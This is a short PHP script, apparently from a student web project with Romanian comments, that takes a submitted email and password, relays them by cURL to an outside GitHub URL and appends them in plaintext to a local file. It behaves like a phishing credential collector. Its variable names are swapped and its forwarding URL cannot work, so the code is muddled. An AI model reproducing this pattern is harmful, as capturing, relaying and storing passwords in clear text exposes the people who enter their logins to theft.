<?php

// Verifică dacă scriptul este accesat prin metoda POST
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Preia datele trimise prin formular
    $nume = $_POST['email'] ?? 'Nedefinit'; // Folosește 'email' pentru nume
    $email = $_POST['parola'] ?? 'Nedefinit'; // Folosește 'parola' pentru email

    // Initialize cURL session
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://github.com/banuion/Aplication_Web/edit/main/login.php"); // Change to your URL
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array('email' => $nume, 'parola' => $email)));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIESESSION, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt'); // Cookies are stored here

    // Execute cURL session
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Curl error: ' . curl_error($ch);
    }
    curl_close($ch);

    // Crează o linie de text cu datele primite
    $text = "Nume: " . strip_tags($nume) . ", Email: " . strip_tags($email) . PHP_EOL;

    // Deschide sau creează fișierul 'date.txt' pentru a adăuga textul primit
    $file = fopen("C:\Users\BANU\Desktop\Tehnologii_WEB_proiect\date.txt", "a"); // 'a' este modul pentru append

    // Verifică dacă fișierul a fost deschis cu succes
    if ($file === false) {
        echo "Eroare la deschiderea fișierului!";
    } else {
        // Scrie textul în fișier și închide fișierul
        fwrite($file, $text);
        fclose($file);

        echo "Datele și cookie-urile au fost salvate cu succes.";
    }
} else {
    // Dacă scriptul nu este accesat prin metoda POST, afișează un mesaj de eroare
    echo "Această pagină trebuie accesată prin metoda POST.";
}

?>
